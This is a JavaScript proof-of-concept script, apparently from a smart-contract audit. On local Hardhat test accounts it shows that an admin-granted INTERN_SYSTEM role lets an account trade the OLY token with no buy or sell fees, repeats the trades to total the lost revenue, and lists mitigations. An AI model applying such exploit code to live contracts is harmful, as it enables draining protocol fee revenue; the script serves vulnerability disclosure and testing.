/**
 * CVE-OLY-005: INTERN_SYSTEM Role Complete Fee Bypass Exploit
 * 
 * CRITICAL VULNERABILITY PROOF OF CONCEPT
 * 
 * This exploit demonstrates how users with INTERN_SYSTEM role can completely
 * bypass all fees, leading to massive revenue loss for the protocol.
 * 
 * ⚠️ FOR TESTNET USE ONLY - DO NOT RUN ON MAINNET
 */

const { ethers } = require("hardhat");
const { expect } = require("chai");

async function main() {
    console.log("🔴 CVE-OLY-005: INTERN_SYSTEM Role Fee Bypass Exploit");
    console.log("=" .repeat(60));
    
    // Get signers
    const [deployer, attacker, normalUser, mainPair, feeReceiver] = await ethers.getSigners();
    
    console.log("👤 Deployer:", deployer.address);
    console.log("🏴‍☠️ Attacker:", attacker.address);
    console.log("👤 Normal User:", normalUser.address);
    console.log("🏪 Main Pair:", mainPair.address);
    console.log("💰 Fee Receiver:", feeReceiver.address);
    console.log("");

    // Step 1: Deploy mock fee receiver
    console.log("📋 Step 1: Deploying Mock Fee Receiver...");
    
    const MockFeeReceiver = await ethers.getContractFactory("MockFeeReceiver");
    const mockReceiver = await MockFeeReceiver.deploy();
    await mockReceiver.waitForDeployment();
    
    console.log("📡 Mock Fee Receiver deployed at:", await mockReceiver.getAddress());

    // Step 2: Deploy OLY contract
    console.log("\n📋 Step 2: Deploying OLY Contract...");
    
    const OLY = await ethers.getContractFactory("OLY");
    const oly = await OLY.deploy(await mockReceiver.getAddress(), 3000); // 3% buy fee
    await oly.waitForDeployment();
    
    console.log("🪙 OLY Contract deployed at:", await oly.getAddress());
    
    const buyFeeRatio = await oly.buyFeeRatio();
    const sellFeeRatio = await oly.feeRatio();
    console.log("💸 Buy Fee Ratio:", buyFeeRatio.toString(), "(3%)");
    console.log("💸 Sell Fee Ratio:", sellFeeRatio.toString(), "(3%)");

    // Step 3: Setup contract state
    console.log("\n📋 Step 3: Setting up Contract State...");
    
    await oly.setMainPair(mainPair.address);
    const MINT_ROLE = await oly.MINT();
    const INTERN_SYSTEM_ROLE = await oly.INTERN_SYSTEM();
    await oly.grantRole(MINT_ROLE, deployer.address);
    
    // Mint tokens for testing
    const mintAmount = ethers.parseUnits("100000", 9);
    await oly.mint(attacker.address, mintAmount);
    await oly.mint(normalUser.address, mintAmount);
    await oly.mint(mainPair.address, mintAmount);
    
    console.log("✅ Main pair set to:", mainPair.address);
    console.log("✅ Tokens minted to attacker:", ethers.formatUnits(mintAmount, 9));
    console.log("✅ Tokens minted to normal user:", ethers.formatUnits(mintAmount, 9));
    console.log("✅ Tokens minted to main pair:", ethers.formatUnits(mintAmount, 9));

    // Step 4: Demonstrate normal fee collection
    console.log("\n📋 Step 4: Demonstrating Normal Fee Collection...");
    
    const tradeAmount = ethers.parseUnits("10000", 9);
    
    // Record initial state
    const initialFeeReceiverBalance = await oly.balanceOf(await mockReceiver.getAddress());
    const initialNormalUserBalance = await oly.balanceOf(normalUser.address);
    
    console.log("💰 Initial Fee Receiver Balance:", ethers.formatUnits(initialFeeReceiverBalance, 9));
    console.log("👤 Initial Normal User Balance:", ethers.formatUnits(initialNormalUserBalance, 9));
    
    // Normal user performs buy transaction (should pay fees)
    console.log("\n🛒 Normal User Buy Transaction:");
    await oly.connect(mainPair).transfer(normalUser.address, tradeAmount);
    
    const afterBuyFeeReceiverBalance = await oly.balanceOf(await mockReceiver.getAddress());
    const afterBuyNormalUserBalance = await oly.balanceOf(normalUser.address);
    
    const buyFeeCollected = afterBuyFeeReceiverBalance - initialFeeReceiverBalance;
    const normalUserReceived = afterBuyNormalUserBalance - initialNormalUserBalance;
    
    console.log("💸 Fee collected:", ethers.formatUnits(buyFeeCollected, 9));
    console.log("💰 User received:", ethers.formatUnits(normalUserReceived, 9));
    console.log("🧮 Expected fee (3%):", ethers.formatUnits(tradeAmount * 3000n / 100000n, 9));
    
    // Normal user performs sell transaction (should pay fees)
    console.log("\n💰 Normal User Sell Transaction:");
    const sellAmount = ethers.parseUnits("5000", 9);
    
    const beforeSellFeeReceiverBalance = await oly.balanceOf(await mockReceiver.getAddress());
    const beforeSellMainPairBalance = await oly.balanceOf(mainPair.address);
    
    await oly.connect(normalUser).transfer(mainPair.address, sellAmount);
    
    const afterSellFeeReceiverBalance = await oly.balanceOf(await mockReceiver.getAddress());
    const afterSellMainPairBalance = await oly.balanceOf(mainPair.address);
    
    const sellFeeCollected = afterSellFeeReceiverBalance - beforeSellFeeReceiverBalance;
    const mainPairReceived = afterSellMainPairBalance - beforeSellMainPairBalance;
    
    console.log("💸 Sell fee collected:", ethers.formatUnits(sellFeeCollected, 9));
    console.log("🏪 Main pair received:", ethers.formatUnits(mainPairReceived, 9));
    console.log("🧮 Expected sell fee (3%):", ethers.formatUnits(sellAmount * 3000n / 100000n, 9));

    // Step 5: Grant INTERN_SYSTEM role to attacker
    console.log("\n📋 Step 5: Granting INTERN_SYSTEM Role to Attacker...");
    
    console.log("🔑 Granting INTERN_SYSTEM role to attacker...");
    await oly.grantRole(INTERN_SYSTEM_ROLE, attacker.address);
    
    const hasRole = await oly.hasRole(INTERN_SYSTEM_ROLE, attacker.address);
    console.log("✅ Attacker has INTERN_SYSTEM role:", hasRole);

    // Step 6: Demonstrate fee bypass exploit
    console.log("\n📋 Step 6: Demonstrating Fee Bypass Exploit...");
    
    const exploitAmount = ethers.parseUnits("50000", 9); // Large amount
    
    // Record state before exploit
    const beforeExploitFeeReceiverBalance = await oly.balanceOf(await mockReceiver.getAddress());
    const beforeExploitAttackerBalance = await oly.balanceOf(attacker.address);
    const beforeExploitMainPairBalance = await oly.balanceOf(mainPair.address);
    
    console.log("💰 Fee Receiver Balance before exploit:", ethers.formatUnits(beforeExploitFeeReceiverBalance, 9));
    console.log("🏴‍☠️ Attacker Balance before exploit:", ethers.formatUnits(beforeExploitAttackerBalance, 9));
    
    // Attacker performs buy transaction (should bypass fees due to INTERN_SYSTEM role)
    console.log("\n🛒 Attacker Buy Transaction (with INTERN_SYSTEM role):");
    console.log("🎯 Buy amount:", ethers.formatUnits(exploitAmount, 9));
    console.log("🧮 Expected fee if normal user:", ethers.formatUnits(exploitAmount * 3000n / 100000n, 9));
    
    await oly.connect(mainPair).transfer(attacker.address, exploitAmount);
    
    const afterBuyExploitFeeReceiverBalance = await oly.balanceOf(await mockReceiver.getAddress());
    const afterBuyExploitAttackerBalance = await oly.balanceOf(attacker.address);
    
    const exploitBuyFeeCollected = afterBuyExploitFeeReceiverBalance - beforeExploitFeeReceiverBalance;
    const attackerBuyReceived = afterBuyExploitAttackerBalance - beforeExploitAttackerBalance;
    
    console.log("💸 Fee collected from attacker buy:", ethers.formatUnits(exploitBuyFeeCollected, 9));
    console.log("💰 Attacker received:", ethers.formatUnits(attackerBuyReceived, 9));
    
    if (exploitBuyFeeCollected === 0n) {
        console.log("🚨 FEE BYPASS CONFIRMED: No fees collected from INTERN_SYSTEM user!");
    }
    
    if (attackerBuyReceived === exploitAmount) {
        console.log("🚨 FULL AMOUNT RECEIVED: Attacker received 100% of transfer amount!");
    }
    
    // Attacker performs sell transaction (should also bypass fees)
    console.log("\n💰 Attacker Sell Transaction (with INTERN_SYSTEM role):");
    const attackerSellAmount = ethers.parseUnits("25000", 9);
    
    const beforeSellExploitFeeReceiverBalance = await oly.balanceOf(await mockReceiver.getAddress());
    const beforeSellExploitMainPairBalance = await oly.balanceOf(mainPair.address);
    
    console.log("🎯 Sell amount:", ethers.formatUnits(attackerSellAmount, 9));
    console.log("🧮 Expected fee if normal user:", ethers.formatUnits(attackerSellAmount * 3000n / 100000n, 9));
    
    await oly.connect(attacker).transfer(mainPair.address, attackerSellAmount);
    
    const afterSellExploitFeeReceiverBalance = await oly.balanceOf(await mockReceiver.getAddress());
    const afterSellExploitMainPairBalance = await oly.balanceOf(mainPair.address);
    
    const exploitSellFeeCollected = afterSellExploitFeeReceiverBalance - beforeSellExploitFeeReceiverBalance;
    const mainPairSellReceived = afterSellExploitMainPairBalance - beforeSellExploitMainPairBalance;
    
    console.log("💸 Fee collected from attacker sell:", ethers.formatUnits(exploitSellFeeCollected, 9));
    console.log("🏪 Main pair received:", ethers.formatUnits(mainPairSellReceived, 9));
    
    if (exploitSellFeeCollected === 0n) {
        console.log("🚨 SELL FEE BYPASS CONFIRMED: No sell fees collected from INTERN_SYSTEM user!");
    }
    
    if (mainPairSellReceived === attackerSellAmount) {
        console.log("🚨 FULL SELL AMOUNT RECEIVED: Main pair received 100% of transfer amount!");
    }

    // Step 7: Calculate revenue loss
    console.log("\n📋 Step 7: Calculating Revenue Loss...");
    
    const totalAttackerTrades = exploitAmount + attackerSellAmount;
    const expectedTotalFees = (exploitAmount * 3000n / 100000n) + (attackerSellAmount * 3000n / 100000n);
    const actualFeesFromAttacker = exploitBuyFeeCollected + exploitSellFeeCollected;
    const revenueLoss = expectedTotalFees - actualFeesFromAttacker;
    
    console.log("📊 Revenue Loss Analysis:");
    console.log("   • Total attacker trades:", ethers.formatUnits(totalAttackerTrades, 9));
    console.log("   • Expected total fees:", ethers.formatUnits(expectedTotalFees, 9));
    console.log("   • Actual fees collected:", ethers.formatUnits(actualFeesFromAttacker, 9));
    console.log("   • Revenue loss:", ethers.formatUnits(revenueLoss, 9));
    console.log("   • Loss percentage:", ((revenueLoss * 100n) / expectedTotalFees).toString() + "%");

    // Step 8: Demonstrate systematic exploitation
    console.log("\n📋 Step 8: Demonstrating Systematic Exploitation...");
    
    console.log("🔄 Performing multiple large trades to maximize revenue loss...");
    
    let totalRevenueLoss = revenueLoss;
    
    for (let i = 1; i <= 5; i++) {
        const systematicAmount = ethers.parseUnits("20000", 9);
        
        const beforeSystematicFeeBalance = await oly.balanceOf(await mockReceiver.getAddress());
        
        // Buy and sell cycle
        await oly.connect(mainPair).transfer(attacker.address, systematicAmount);
        await oly.connect(attacker).transfer(mainPair.address, systematicAmount);
        
        const afterSystematicFeeBalance = await oly.balanceOf(await mockReceiver.getAddress());
        const cycleFeesCollected = afterSystematicFeeBalance - beforeSystematicFeeBalance;
        const expectedCycleFees = (systematicAmount * 3000n / 100000n) * 2n; // Buy + sell
        const cycleLoss = expectedCycleFees - cycleFeesCollected;
        
        totalRevenueLoss += cycleLoss;
        
        console.log(`   Cycle ${i}: Lost ${ethers.formatUnits(cycleLoss, 9)} in fees`);
    }
    
    console.log("💸 Total systematic revenue loss:", ethers.formatUnits(totalRevenueLoss, 9));

    // Step 9: Test role revocation
    console.log("\n📋 Step 9: Testing Role Revocation...");
    
    console.log("🔑 Revoking INTERN_SYSTEM role from attacker...");
    await oly.revokeRole(INTERN_SYSTEM_ROLE, attacker.address);
    
    const hasRoleAfterRevoke = await oly.hasRole(INTERN_SYSTEM_ROLE, attacker.address);
    console.log("❌ Attacker has INTERN_SYSTEM role after revoke:", hasRoleAfterRevoke);
    
    // Test that fees are now collected
    const testAmount = ethers.parseUnits("1000", 9);
    const beforeRevokeFeeBalance = await oly.balanceOf(await mockReceiver.getAddress());
    
    await oly.connect(mainPair).transfer(attacker.address, testAmount);
    
    const afterRevokeFeeBalance = await oly.balanceOf(await mockReceiver.getAddress());
    const revokeTestFee = afterRevokeFeeBalance - beforeRevokeFeeBalance;
    
    console.log("💸 Fee collected after role revoke:", ethers.formatUnits(revokeTestFee, 9));
    
    if (revokeTestFee > 0n) {
        console.log("✅ Fees are now being collected - role revocation effective");
    }

    // Step 10: Impact Assessment
    console.log("\n📋 Step 10: Impact Assessment");
    console.log("=" .repeat(60));
    
    console.log("🔍 VULNERABILITY ANALYSIS:");
    console.log("   • INTERN_SYSTEM role provides complete fee exemption");
    console.log("   • No limits or monitoring on role usage");
    console.log("   • Admin can grant role to any address");
    console.log("   • Role grants are permanent until revoked");
    console.log("");
    
    console.log("💰 FINANCIAL IMPACT:");
    console.log("   • Complete revenue loss from fee exemptions");
    console.log("   • Unfair competitive advantages");
    console.log("   • Systematic exploitation possible");
    console.log("   • Total revenue loss demonstrated:", ethers.formatUnits(totalRevenueLoss, 9));
    console.log("");
    
    console.log("🛡️ MITIGATION REQUIRED:");
    console.log("   • Add monitoring and limits on INTERN_SYSTEM role usage");
    console.log("   • Implement time-limited role grants");
    console.log("   • Add transparency through events for role changes");
    console.log("   • Consider partial fee reduction instead of complete bypass");
    console.log("   • Implement multi-signature for role management");

    console.log("\n🔴 ROLE BYPASS EXPLOIT COMPLETED");
    console.log("⚠️ This demonstrates CRITICAL access control vulnerability");
}

// Mock Fee Receiver Contract Source
const mockFeeReceiverSource = `
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract MockFeeReceiver {
    event SwapTriggered();
    
    function triggerSwapFeeForLottery() external {
        emit SwapTriggered();
    }
}
`;

// Export for use in other scripts
module.exports = {
    main,
    mockFeeReceiverSource
};

// Run if called directly
if (require.main === module) {
    main()
        .then(() => process.exit(0))
        .catch((error) => {
            console.error("💥 Exploit failed:", error);
            process.exit(1);
        });
}